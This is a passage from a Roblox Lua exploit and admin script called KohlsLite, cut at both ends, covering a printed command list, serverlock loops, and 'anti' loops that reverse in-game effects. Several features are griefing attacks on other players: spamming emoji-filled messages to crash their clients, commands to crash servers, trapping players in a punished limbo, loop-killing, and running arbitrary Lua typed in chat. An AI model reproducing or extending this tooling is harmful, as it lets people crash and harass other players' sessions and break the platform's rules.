                           Remind("Player doesn't exist!")
                  end
   end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unpkick' then
                antichatplr = false
                Chat("reset "..acplr)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'bkick' then
                   acplr = string.sub(msg:lower(), #prefix + 7)
                   PLAYERCHECK(acplr)
                   if player ~= nil and not table.find(nokick, player) then
                           Chat(prefix.."laser "..acplr)
			   Chat("blind "..acplr)
                        antichatplr = true
                   elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else
                           Remind("Player doesn't exist!")
                  end
   end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unbkick' then
                antichatplr = false
                Chat("reset "..acplr)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'autoff' then
        autoff = true
        Remind("Auto ff is on!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unautoff' then
        autoff = false
        Remind("Auto ff is off!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autogod' then
        autogod = true
        Remind("Auto god is on!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautogod' then
        autogod = false
        Remind("Auto god is off!")
    end        

end)

function CMDPrint()
print("---Command list for KohlsLite---")
print("Warning! This is NOT a full list so contact me for any other commands!")

print("\n\n\n")
print("perm - loopgrab a random pad (touch interest)")
print("perm2 - loopgrab a random pad (collisions)")

print("\n\n\n")
print("unperm - stop loopgrabing a pad(perm)")
print("unperm2 - stop loopgrabing a pad (perm2)")

print("\n\n\n")
print("loopgrab - loopgrab all the pads (touch interest)")
print("loopgrab2 - loopgrab all the pads (touch interest)")

print("\n\n\n")
print("unloopgrab - stop loopgrabing all the pads")
print("2unloopgrab - stop loopgrab all the pads")

print("\n\n\n")
print("fastpads - quickly tp to all the pads")
print("regen - regenerate the admin pads")
print("sregen - spam regenerate the admin pads")
print("unsregen - stop spam regenerating the admin pads")

print("\n\n\n")
print("padban - stop a user from using the admin pads")
print("unpadban - allow user to use admin pads again")
print("padreinf - stop users from taking more than 2 admin pads")
print("unpadreinf - allow users to take more than 2 admin pads again")

print("\n\n\n")
print("wl - whitelist a player from serverlocks")
print("bl - blacklist a player (serverlock to certain players)")
print("gearwl - whitelist a user to use gears with antigear/anticrash etc. on")
print("admin - give a user free admin that can be used off yours")

print("\n\n\n")
print("unwl - unwhitelist a player from serverlocks")
print("unbl - unblacklist a player")
print("ungearwl - unwhitelist a user to use gears with antigear/anticrash etc. on")
print("unadmin - remove a user's free admin")

print("\n\n\n")
print("listwl - print all whitelisted players")
print("listbl - print all blacklisted players")
print("listgearwl - print all gear whitelisted players")
print("adminlist - print all admined players")
print("musiclist - print all the saved musics")
print("permusers - users that use perm")
print("personsusers - users that use persons")

print("\n\n\n")
print("slock - serverlock a server")
print("unslock - serverlock a server")
print("newplrslock - automatically blacklist a new user (acc age under 21 days)")
print("unnewplrslock - stop automatic blacklist for new users (acc age under 21 days)")

print("\n\n\n")
print("alladmin - give everyone's free admin")
print("unalladmin - remove everyone's free admin")

print("\n\n\n")
print("ipboom - who's ip address is that?")

print("\n\n\n")
print("sspawn - save your position")
print("gsspawn - go to saved position")
print("pspawn - print your current position")

print("\n\n\n")
print("prefix - set the prefix")
print("ping - say your ping")
print("execute - execute a lua script from chat")
print("iy - execute iy")
print("adv - advertise this script (pls do this you are nice if you do this :D)")
print("cadv - advertise the kah community server (pls do this you are nice if you do this :D)")
print("frespawn - force respawn if punished")

print("\n\n\n")
print("welmsg - welcome people to the server (and leave msg too)")
print("unwelmsg - no more welcome and leave msg")

print("\n\n\n")
print("autoafk - names you as afk when you're afk")
print("unautoafk - stops naming you as afk when you're afk")

print("\n\n\n")
print("nocam/breakcam - break the camera with the AR")
print("fixcam - fix the camera (client side)")
print("wbcam/wfcam - break/fix the camera with the blizzard wand")
print("bpfixv - fix baseplate velocity serverside")

print("\n\n\n")
print("goto - alt to tp me plr")
print("cgoto - goto without admin")
print("bring - alt to tp plr me")

print("\n\n\n")
print("biglogs - make the logs bigger!")
print("chatz - chat a string of - causing the previous messages to vanish")

print("\n\n\n")
print("qattach - quickly attach to something with unpunish")

print("\n\n\n")
print("house - teleport to the house")
print("spawn - teleport to spawn")

print("\n\n\n")
print("infjump - infinite jump")
print("uninfjump - stop infinite jump")

print("\n\n\n")
print("checkperm - check player for perm")
print("checkpersons - check player for persons")
print("checkgps - check player for both")
print("checkbp - check a player's backpack")

print("\n\n\n")
print("spamt - start spamming something")
print("unspamt - stop spamming")
print("spamw/spamw - the spam wait")
print("spamoff - stop spamming (temp)")
print("spamon - start spamming again")

print("\n\n\n")
print("fixpaint - fix the paint")
print("pmap/paintmap - paint the map a colour")

print("\n\n\n")
print("icemap - make the map ice - WARNING: THIS COMMAND MIGHT CRASH YOU")
print("stonemap/rockmap - make the map stone")

print("\n\n\n")
print("NOK - no obby kill")
print("2NOK - no obby kill")

print("\n\n\n")
print("sp - set your speed without the command")
print("jp - set your jump power without the command")
print("hlth - set your health without the command")
print("ufly - the kah fly but without actually using the cmd!")

print("\n\n\n")
print("gear (plr) (name) - just a shortcut if you don't know gear ids")
print("char (plr) (name) - just a shortcut if you don't know char ids")
print("boombox - shortcut for gear plr boombox")

print("\n\n\n")
print("rejoin - rejoin the server you're in")
print("shop - switch to a different server")

print("\n\n\n")
print("lagged - slow a player down with the car gear")
print("unlagged - stop slowing a player down with the car gear")
print("names - spam name a player, naming currently breaks your cam")
print("unnames - stop spam naming a player, naming currently breaks your cam")

print("\n\n\n")
print("announce - announce a message without your username in the h")
print("cannounce - announce a message with the sender being someone in the server [troll]")

print("\n\n\n")
print("pinglogs - ping you when someone uses logs")
print("antilogs - spams logs when someone tries using it")
print("pingcsystem - ping you when someone uses /c system (or /w)")
print("logspam - spam the logs")

print("\n\n\n")
print("gearban - stop a user from using gears with the portable justice")

print("\n\n\n")
print("supercmd - spam text a set amount of times")
print("supert - times the spam should happen (anything above 128 exceeds the rate limit)")

print("\n\n\n")
print("pmu - your music only, if someone tries to change or stop it changes back")
print("unpmu - not your music only anymore")
print("offmusic - turn the perm music off temporarily")
print("onmusic - turn perm music on")
print("antimusic - stop music from playing")
print("unantimusic - lets people use music again")

print("\n\n\n")
print("remusic - restart the current music")
print("volm - set the volume of the music")
print("cvol - print the current volume of music")
print("musicid - print the current music id")
print("timepos - set the time position")
print("timeis - print the current time position")

print("\n\n\n")
print("pausem - pause the music")
print("playm - play the music")
print("stopm - stop the music")
print("startm - start the music")

print("\n\n\n")
print("gmusic(num) - play saved music")
print("rgmusic - play a random saved music")
print("nmusic - play the next saved music")
print("pmusic - play the previous saved music")

print("\n\n\n")
print("mboombox (musicid) - play a music on your boombox at a random place away from you")
print("pboombox (musicid) - play a music on your boombox without inserting it into the box :)")

print("\n\n\n")
print("vgcrash - crash with the vg")
print("dcrash - crash with clone and dog commands") 
print("fcrash - crash with clone and freeze commands")
print("pcrash - crash with the osas")
print("[PERSONS REQUIRED] scrash - crash with the shield, rocket and clone commands")

print("\n\n\n")
print("anticrash - anti-crash with vg or osas")
print("2anticrash - anti-crash with vg or osas")
print("antigear - stop users from using gears")
print("2antigear - stop users from using gears")
print("antipaint - stop users from using the paint bucket and Subspace Tripmine")
print("antigb - stop users from using the portable justice and car gear") 
print("noblt - stop users using other misc blacklisted tools")
print("antiray - stop users from using the ray gun")
print("antiattach2 - stop users from using the Ivory Periastron [exploiter]")
print("antit - stop yourself from using gears")
print("antikick - stop yourself from using hotpotato, bluebucket and the car gear")
print("antitrip - anti trip mine")

print("\n\n\n")
print("ffix - fix your gravity and collision if it breaks when trying to move/fix stuff!")
print("fixgrav - fix gravity")
print("fixvelo - fix velocity")
print("fixcol - fix collisions")

print("\n\n\n")
print("fixbp - fix the baseplate")
print("movebp - move the baseplate")
print("fixspawn - fix the spawns")
print("movespawn - move the spawns")
print("fixregen - fix the regen")
print("moveregen - move the regen")
print("fixpads - fix the pads")
print("movepads - move the pads")
print("fixfl - fix the floor")
print("movefl - move the floor")
print("fixobby - fix the obby")
print("moveobby - move the obby")
print("fixkb - fix the kill bricks")
print("movekb - move the kill bricks")
print("fixobox - fix the obby box")
print("moveobox - move the obby box")
print("fixadv - fix the admin dividers")
print("moveadv - move the admin dividers")
print("fixhouse - fix the house")
print("movehouse - move the house")
print("fixbb - fix the building bricks")
print("movebb - move the building bricks")
	
print("\n\n\n")
print("antichat - crash everyone else by spamming a m command full of emojis")
print("unantichat - stop trying to crash players with emojis.")
print("mkick - crash players with emojis using pm.")
print("unmkick - stop trying to crash players with emojis.")
print("rkick - crash someone using the rocket.")
print("unrkick - stop trying to crash people using the rocket.")
	
print("\n\n\n")
print("rail - rail a player")
print("surround - surround a player with planes")
print("nuke - nuke a player with planes")

print("\n\n\n")
print("ungearme - ungear yourself... Right???")

print("\n\n\n")
print("laser - laser and punish someone at the same time. they cannot respawn and are stuck in limbo")
print("hfreeze - laser someone but stop them from fully getting lasered. they get stuck with a laser outline")
print("tattach - attach to a player to control them!")

print("\n\n\n")
print("--- ANTI INFORMATION ---")
print("There are also many other antis!")
print("For antis relating to the player, do (antiname) me/others/all")
print("To turn off the antis, do un(antiname) me/others/all")
print("If it's to the game itself, just do (antiname).")

print("\n\n\n")
print("--- INFORMATION ---")
print("KohlsLite, since 2023. Created by ScriptingProgrammer/ts2021")
print("For help, please contact me on Discord at ts2021x")
print("The version you are using is v"..getgenv().klversion..". This build was created on 26th April 2024 Build")
print("Better than scv1 and scv2 - approved by Tech!")

print("\n\n\n")
print("--- CREDITS ---")
print("Tech and other admins of SC with Shortcut v1, v2 and v3 [var] (and some ideas)")
print("atprog with his PR Script")
print("iiDk's with ii's stupid admin as PR Script is based off it")
print("Gojo [SimpleKAH] for gears and char ids")
print("Dizzy [ROUTE] for music ids hahaha I'm a muskid")

print("\n\n\n")
print("--- ADDITIONAL INFO ---")
print("1a. This script has some stuff missing and some stuff broken but it's not really finished. There's many stuff I'm still adding.")
print("1b. If you want a good script and have some money/robux, get Shortcut v3-var by dming techq")
print("2a. With the /n/n/n that hides your username, it does NOT work on newer Roblox guis (my old main and my second alt have it.")
print("2b. Instead, it will show as the name at the top.")
print("2c. I cannot change the /n/n/n or the text won't be on the bar which is ugly. Sorry!")

end

-- CHECK FOR PERM
function checkforperm()
        if string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 66254), 66254) then
            Remind(gcplrn.." has perm in NBC!")
          --  Speak(gcplrn.." has perm in NBC!")
            if not table.find(permusers, gcplrn) then
                    table.insert(permusers, gcplrn)
            end
        elseif string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 64354), 64354) then
            Remind(gcplrn.." has perm in BC!")
           -- Speak(gcplrn.." has perm in BC!")
            table.insert(permusers, gcplrn)
            if not table.find(permusers, gcplrn) then
                    table.insert(permusers, gcplrn)
            end
        else 
                Remind(gcplrn..' does not have perm!')
            --    Speak(gcplrn..' does not have perm!')
        end
end

-- CHECK FOR PERSONS
function checkforpersons()
        if string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 35748), 35748) then
            Remind(gcplrn.." has persons in NBC!")
           -- Speak(gcplrn.." has persons in NBC!")
            table.insert(personsusers, gcplrn)
            if not table.find(personsusers, gcplrn) then
                    table.insert(personsusers, gcplrn)
            end
        elseif string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 37127), 37127) then
            Remind(gcplrn.." has persons in BC!")
           -- Speak(gcplrn.." has persons in BC!")
            table.insert(personsusers, gcplrn)
            if not table.find(personsusers, gcplrn) then
                    table.insert(personsusers, gcplrn)
            end
        else 
                Remind(gcplrn..' does not have persons!')
             --   Speak(gcplrn..' does not have persons!')
        end
end

-- Serverlock, blacklist, whitelist (not that good but decent still)
task.spawn(function()
    while true do
    task.wait(0)
    local players = game.Players:GetPlayers()
    for i, v in pairs(game.Workspace:GetChildren()) do
        if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(whitelist, v.Name) and not table.find(pwl, v.Name)) then
            for i, player in ipairs(players) do
                if string.find(player.Name:lower(), v.Name:lower()) then
                    if slockenabled == true then
                        if not game.Lighting:FindFirstChild(v.Name) then
                                local isB,spe = bypassattemptcheck(v.Name)
                                if isB then
                                        Chat('punish '.. spe)
                                        Chat('blind '.. spe)
                                        Chat("pm "..spe.." [KohlsLite]: sorry, this server is locked!")
                                else
                                         Chat('punish '..v.Name)
                                                Chat('blind '..v.Name)        
                                         Chat("pm "..v.Name.." [KohlsLite]: sorry, this server is locked!")
                                end
                        end
                    elseif table.find(blacklist, v.Name) then
                        if not game.Lighting:FindFirstChild(v.Name) then
                                local isB,spe = bypassattemptcheck(v.Name)
                                if isB then -- i added because of some guy called m_artin who did crap
                                        Chat('punish '.. spe)
                                        Chat('blind '.. spe)
                                        Chat("pm "..spe.." [KohlsLite]: sorry, you are blacklisted from this server")
                                else
                                         Chat('punish '..v.Name)
                                                Chat('blind '..v.Name)        
                                         Chat("pm "..v.Name.." [KohlsLite]: sorry, you are blacklisted from this server!")
                                end
                        end
                    elseif table.find(newplrslocked, v.Name) and newplrautoslock == true then
                        if not game.Lighting:FindFirstChild(v.Name) then
                                local isB,spe = bypassattemptcheck(v.Name)
                                if isB then
                                        Chat('punish '.. spe)
                                        Chat('blind '.. spe)
                                        Chat("pm "..spe.." [KohlsLite]: sorry, you are blacklisted for having an account under the account age limit")
                                else
                                        Chat('punish '..v.Name)
                                        Chat('blind '..v.Name)
                                        Chat("pm "..v.Name.." [KohlsLite]: sorry, you are blacklisted for having an account under the account age limit!")
                                end
                        end
                    else
                    end
                    break
                end
            end
        end
    end
    end
end)

-- visual
task.spawn(function()
    while true do
        task.wait()
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetChildren()) do
            if v:IsA('Script') then
                  if antidisco == true then    
                          if v.Name == "Disco" then
                              v:Destroy() -- :)
                              Chat("fix")
                          end
                  end
                  if antiflash == true then    
                          if v.Name == "Flash" then
                              v:Destroy() -- :)
                              Chat("fix")
                          end
                  end
            end
        end

        if antifogend == true then
           if game.Lighting.FogEnd ~= 100000 then
              Chat("fogend 100000")
           end
        end

        if antiilight == true then
                 if game.Workspace:FindFirstChild("StarShard") then
                          game.Workspace.StarShard:Destroy()
                end
                if game.Workspace:FindFirstChild("Part") then
                          if game.Workspace.Part:FindFirstChild("Twinkle") then
                                   game.Workspace.Part:Destroy()
                           end
                 end
        end

        if gjdelock == true then
           if game.Lighting.FogEnd ~= 500 then
              Chat("fogend 500")
              Chat("fogcolor 0 0 0") -- i don't know what 0 0 0 is as color3 so it's added to this category
           end
        end

        if antifogcolor == true then
                if game.Lighting.FogColor ~= Color3.new(0.75294125080109,0.75294125080109,0.75294125080109) then
                        Chat("fogcolor 192 192 192")        
                end
        end

        if antifogstart == true then
           if game.Lighting.FogStart ~= 0 then
                Chat("fogstart 0")           
           end
        end

        if antitime == true then
                if game.Lighting.ClockTime ~= 14 then
                        Chat("time 14")
                end
        end

        if gjdelock == true then
                if game.Lighting.ClockTime ~= 6 then
                        Chat("time 6")
                end
        end

        if antitripmine == true then
           if workspace:FindFirstChild("SubspaceTripmine") then
              workspace:FindFirstChild("SubspaceTripmine"):Destroy()
              Chat("clr")
           end
        end

        if antiambient == true then
                if game.Lighting.Ambient ~= Color3.new(0,0,0) then
                        Chat("ambient 0 0 0")
                end
        end

        if antibrightness == true then
                if game.Lighting.Brightness ~= 1 then
                        Chat("brightness 1")                
                end        
        end

        if antioutamb == true then
                if game.Lighting.OutdoorAmbient ~= Color3.fromRGB(128,128,128) then
                        Chat("outdoorambient 128 128 128")                
                end        
        end

  end
end)

-- anti chat/msg-crash
task.spawn(function()
        while true do
        task.wait(0.1)
                if antichat == true then
                        --if haspersons == true then
                        --        Chat("m/ [KohlsLite]: 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        --else
                                Chat("m [KohlsLite]: 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        --end
                end
                if antichatplr == true then
                        -- if haspersons == true then
                                  -- Chat("pm/"..acplr.." [KohlsLite]: 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        -- else
                                Chat("pm "..acplr.." [KohlsLite]: 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        -- end
                end
        end
end)

-- ANTIS FOR YOU ONLY
task.spawn(function()
        while true do
        task.wait()
        if YOUantiblind == true then
           for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "EFFECTGUIBLIND" then
                    v:Destroy()
                end
            end
        end

        if YOUantigs == true then
                if game.Workspace.CurrentCamera:FindFirstChild("GrayScale") then
                        game.Workspace.CurrentCamera:FindFirstChild("GrayScale"):Destroy()        
                end
        end

        if YOUantiaddon == true then
            if game.Players.LocalPlayer.Character:FindFirstChild("Addon") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Addon"):Destroy()
                    Chat("reset me")
            end
        end

        if YOUanticlone == true then
            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(game.Players.LocalPlayer.Name) then
                Chat("unclone me")
            end
        end

        if YOUantidog == true then
                for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                        if v:IsA("Seat") then
                                Chat("undog me")
                        end
                    end
        end

        if YOUantifire == true then
            if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
                if game.Players.LocalPlayer.Character.Torso:FindFirstChild("Fire") then
                    game.Players.LocalPlayer.Character.Torso:FindFirstChild("Fire"):Destroy()
                    Chat("unfire me")
                end
            end
        end

        if YOUantifreeze == true then
             if game.Players.LocalPlayer.Character:FindFirstChild("ice") then
                Chat("thaw me")
            end
        end

        if YOUantifly == true then
            if not game.Players.LocalPlayer.Character:FindFirstChild("Seizure") and game.Players.LocalPlayer.Character.Humanoid:GetState().Name == "PlatformStanding" then
                Chat("unfly me")
                Chat("clip me")
            end
        end

        if YOUantinoclip == true then
            if game.Players.LocalPlayer.PlayerGui:FindFirstChild("NoClip") then
                game.Players.LocalPlayer.PlayerGui:FindFirstChild("NoClip"):Destroy()
                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Torso then 
                        game.Players.LocalPlayer.Character.Torso.Anchored = false 
                end
                    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid then 
                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false 
                end
                Chat("clip me")
            end
        end

        if YOUantiff == true then
         if game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
                game.Players.LocalPlayer.Character:FindFirstChild("ForceField"):Destroy()
                Chat("unff me")
            end
        end

        if autoff == true then
            if not game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
                Chat("ff me")
                task.wait(0.1)
            end
        end

        if autogod == true then
            if tostring(game.Players.LocalPlayer.Character.Humanoid.MaxHealth) ~= "inf" then
                    Chat("god me")
                game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
                game.Players.LocalPlayer.Character.Humanoid.Health = 9e9            
            end
        end

        if YOUantiglow == true then
                local torso = game.Players.LocalPlayer.Character:WaitForChild("Torso", 1)
                        for i,v in pairs(torso:GetChildren()) do
                                if v:IsA("PointLight") then
                                                    v:Destroy()
                                                    Chat("unglow me")
                                       end
                            end
        end

        if YOUantihealthc == true then
           if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.Health ~= 100 then
                Chat("health me 100")         
           end
        end

        if YOUantijail == true then
            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(game.Players.LocalPlayer.Name .. "'s jail") then
                Chat("unjail me")
            end
        end

        if YOUantijump == true then
            if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.JumpPower ~= 50 then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
            end
        end

        if YOUantikill == true then
           if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
                    Chat("reset me")
           end
        end

        if YOUantimsg == true then
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                        if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" or v.Name == "Ice" then
                                    v:Destroy()
                        end
                end
                for i, v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
                        if v.Name == "Message" then
                                v:Destroy()
                        end
                end
        end

        if YOUantiname == true then
             if game.Players.LocalPlayer and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Model") then
                Chat("reset me")
             end
        end

        if YOUantichar == true then
           if game.Players.LocalPlayer.UserId ~= game.Players.LocalPlayer.CharacterAppearanceId then
              Chat("unchar me")
           end
        end

        if YOUantiparticles == true then
                local torso = game.Players.LocalPlayer.Character:WaitForChild("Torso", 1)
                        for i,v in pairs(torso:GetChildren()) do
                                if v:IsA("ParticleEmitter") then
                                                    v:Destroy()
                                                    Chat("unparticles me")
                                       end
                            end
        end

        if YOUantipunish == true then
            if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                Chat("unpunish me")
            end
        end

        if YOUantirocket == true then
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v.Name == "Rocket" then 
                             v:Destroy()
                        end
                end
        end

        if YOUantisit == true then
           local player = game.Players.LocalPlayer
                     if player.Character then
                    local humanoid = player.Character:WaitForChild("Humanoid", 1)
                    if humanoid and humanoid.Sit then
                        humanoid.Sit = false
                        Chat("unsit me")
                    end
                     end
        end

        if YOUantiseizure == true then
            if game.Players.LocalPlayer.Character:FindFirstChild("Seizure") then
                Chat("unseizure me")
            end
        end

        if YOUantismoke == true then
             if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
                if game.Players.LocalPlayer.Character.Torso:FindFirstChild("Smoke") then
                    game.Players.LocalPlayer.Character.Torso:FindFirstChild("Smoke"):Destroy()
                    Chat("unsmoke me")
                end
            end
        end

        if YOUantisparkles == true then
                local torso = game.Players.LocalPlayer.Character:WaitForChild("Torso", 1)
                        for i,v in pairs(torso:GetChildren()) do
                                if v:IsA("Sparkles") then
                                                    v:Destroy()
                                                    Chat("unparticles me")
                                       end
                            end
        end

        if YOUantispeed == true then
            if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 16 then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
            end
        end

        if YOUantispin == true then
                if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
                        if game.Players.LocalPlayer.Character.Torso:FindFirstChild("SPINNER") then
                                game.Players.LocalPlayer.Character.Torso:FindFirstChild("SPINNER"):Destroy()
                                    Chat("unspin me")
                        end
                end
        end

        if YOUantistun == true then
            local player = game.Players.LocalPlayer
             if player.Character then
                    local humanoid = player.Character:WaitForChild("Humanoid", 1)
                    if humanoid and humanoid.PlatformStand then
                        humanoid.PlatformStand = false
                        Chat("unstun me")
                    end
             end
        end

        if YOUantisetgrav == true then
                if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
                        if game.Players.LocalPlayer.Character.Torso:FindFirstChildOfClass("BodyForce") then
                                        game.Players.LocalPlayer.Character.Torso:FindFirstChildOfClass("BodyForce"):Destroy()
                                        Chat("respawn me")
                        end
                end
        end

        if YOUantiswag == true then
                if game.Players.LocalPlayer.Character:FindFirstChild("EpicCape") then
                        game.Players.LocalPlayer.Character:FindFirstChild("EpicCape"):Destroy()
                        Chat("normal me")
                end
        end

        end
end)

-- ANTIS FOR EVERYONE
task.spawn(function()
        while true do
                task.wait()
                for i, v in ipairs(game.Players:GetPlayers()) do
                --        print("Debug msg 1")
                        if v.Name ~= game.Players.LocalPlayer.Name then
                                -- print("Debug msg 2: "..v.Name)

                                if ALLantiaddon == true then
                                            if v.Character and v.Character:FindFirstChild("Addon") then
                                                    Chat("reset "..v.Name)
                                           end
                                end

                                if ALLanticlone == true then
                                            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(v.Name) then
                                                Chat("unclone "..v.Name)
                                        else end
                                end

                                if ALLantidog == true then
                                             for i,x in pairs(v.Character:GetDescendants()) do
                                                if x:IsA("Seat") then
                                                        Chat("undog "..v.Name)
                                                else end
                                        end
                                end

                                if ALLantifire == true then
                                            if v.Character and v.Character:FindFirstChild("Torso") then
                                                if v.Character.Torso:FindFirstChild("Fire") then
                                                            Chat("unfire "..v.Name)
                                                else end
                                        else end
                                end

                                if ALLantifreeze == true then
                                             if v.Character and v.Character:FindFirstChild("ice") then
                                                        Chat("thaw "..v.Name)
                                        else end
                                end

                                if ALLantifly == true or gjdelock == true then
                                            if not v.Character:FindFirstChild("Seizure") and v.Character.Humanoid:GetState().Name == "PlatformStanding" then
                                                Chat("unfly "..v.Name)
                                                        Chat("clip "..v.Name)
                                        else end
                                end

                                if ALLantiff == true then
                                         if v.Character and v.Character:FindFirstChild("ForceField") then
                                                Chat("unff "..v.Name)
                                        else end
                                end

                                 if checkperm2 == true then
                                         if v.Character and v.Character:FindFirstChild("ForceField") then
                                                if not table.find(permusers, v.Name) then
                                                        print(v.Name.." has perm.")
                                                        table.insert(permusers, v.Name)
                                                        Chat("unff "..v.Name)
                                                end
                                            end
                                 end

                                if ALLantiglow == true then
                                        local torso = v.Character:WaitForChild("Torso", 1)
                                        for i,x in pairs(torso:GetChildren()) do
                                                if x:IsA("PointLight") then
                                                            x:Destroy()
                                                            Chat("unglow "..v.Name)
                                                       end
                                            end
                                end

                                if ALLantihealthc == true then
                                           if v.Character.Humanoid.Health ~= 100 then
                                                Chat("health "..v.Name.." 100")
                                        else end
                                        end

                                if ALLantijail == true then
                                            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(v.Name .. "'s jail") then
                                                        Chat("unjail "..v.Name)
                                        else end
                                        end

                                if ALLantijump == true then
                                            if v.Character.Humanoid.JumpPower ~= 50 then
                                                Chat("normaljump "..v.Name)
                                          else end
                                end

                                if ALLantikill == true or table.find(antikill, v.Name) then
                                           if v.Character.Humanoid.Health == 0 then
                                                    Chat("reset "..v.Name)
                                          else end
                                end

                                if table.find(loopkill, v.Name) then
                                        if v.Character.Humanoid.Health ~= 0 then
                                                    Chat("kill "..v.Name)
                                        end
                                end

                                if ALLantichar == true then
                                           if v.UserId ~= v.CharacterAppearanceId then
                                                      Chat("unchar "..v.Name)
                                        else end
                                end

                                if ALLantiname == true then
                                           if v and v.Character:FindFirstChildOfClass("Model") then
                                                Chat("reset "..v.Name)
                                           else end
                                end

                                if ALLantiparticles == true then
                                        local torso = v.Character:WaitForChild("Torso", 1)
                                        for i,x in pairs(torso:GetChildren()) do
                                                if x:IsA("ParticleEmitter") then
                                                            x:Destroy()
                                                            Chat("unparticle "..v.Name)
                                                       end
                                            end
                                end

                                if ALLantipunish == true then
                                            if game.Lighting:FindFirstChild(v.Name) then
                                                        Chat("unpunish "..v.Name)
                                          else end
                                end

                                if ALLantirocket == true then
                                           if v.Character and v.Character:FindFirstChild("Rocket") then
                                                Chat("reload "..v.Name)
                                          else end
                                end

                                if ALLantisit == true then
                                            local humanoid = v.Character:WaitForChild("Humanoid", 1)
                                            if humanoid and humanoid.Sit then
                                                        Chat("unsit "..v.Name)
                                        else end
                                end

                                if ALLantiseizure == true then
                                                if v.Character and v.Character:FindFirstChild("Seizure") then
                                                Chat("unseizure "..v.Name)
                                          else end
                                end

                                if ALLantismoke == true then
                                             if v.Character and v.Character:FindFirstChild("Torso") then
                                                        if v.Character.Torso:FindFirstChild("Smoke") then
                                                            Chat("unsmoke "..v.Name)
                                                  else end
                                          else end
                                end

                                if ALLantisparkles == true then
                                        local torso = v.Character:WaitForChild("Torso", 1)
                                        for i,x in pairs(torso:GetChildren()) do
                                                if x:IsA("Sparkles") then
                                                            x:Destroy()
                                                            Chat("unsparkles "..v.Name)
                                                       end
                                            end
                                end

                                if ALLantispeed == true then
                                            if v.Character.Humanoid.WalkSpeed ~= 16 then
                                                Chat("speed "..v.Name.." 16")
                                         else end
                                end

                                if ALLantispin == true then
                                        if v.Character and v.Character:FindFirstChild("Torso") then
                                                if v.Character.Torso:FindFirstChild("SPINNER") then
                                                            Chat("unspin "..v.Name)
                                                end
                                                end
                                end

                                if gjdelock == true then
                                            if not v.Character.Humanoid.WalkSpeed == 0 then
                                                        Chat("speed "..v.Name.." 0")
                                            end
                                end

                                if ALLantistun == true then
                                            local humanoid = v.Character:WaitForChild("Humanoid", 1)
